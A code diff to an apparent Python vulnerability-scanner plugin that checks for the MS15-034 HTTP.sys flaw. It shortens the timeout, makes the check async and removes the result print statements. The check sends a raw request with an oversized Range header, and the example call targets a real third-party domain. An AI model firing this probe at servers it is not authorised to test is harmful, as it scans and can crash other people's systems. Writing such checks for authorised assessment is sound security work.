@@ -13,14 +13,14 @@ class MS15_034_BaseVerify:
             'type': 'RCE'
         }
         self.url = url
-        self.timeout = 60
+        self.timeout = 3
         url_parse = urlparse(self.url)
         self.host = url_parse.hostname
         self.port = url_parse.port
         if not self.port:
             self.port = '80'
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -37,19 +37,16 @@ class MS15_034_BaseVerify:
             flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n".encode('utf-8')
             s.send(flag)
             data = s.recv(1024)
-            s.close()
             if 'Requested Range Not Satisfiable' in data.decode('utf-8') and 'Server: Microsoft' in data.decode('utf-8'):
-                print("存在MS15-034 HTTP.sys远程代码执行漏洞")
                 return True
-            else:
-                print("不存在MS15-034 HTTP.sys远程代码执行漏洞")
-                return False
         except Exception as e:
-            print(e)
-            print("不存在MS15-034 HTTP.sys远程代码执行漏洞")
-            return False
-        finally:
+            # print(e)
             pass
+        finally:
+            try:
+                s.close()
+            except:
+                pass
 
 if  __name__ == "__main__":
     MS15_034 = MS15_034_BaseVerify('http://baidu.com')
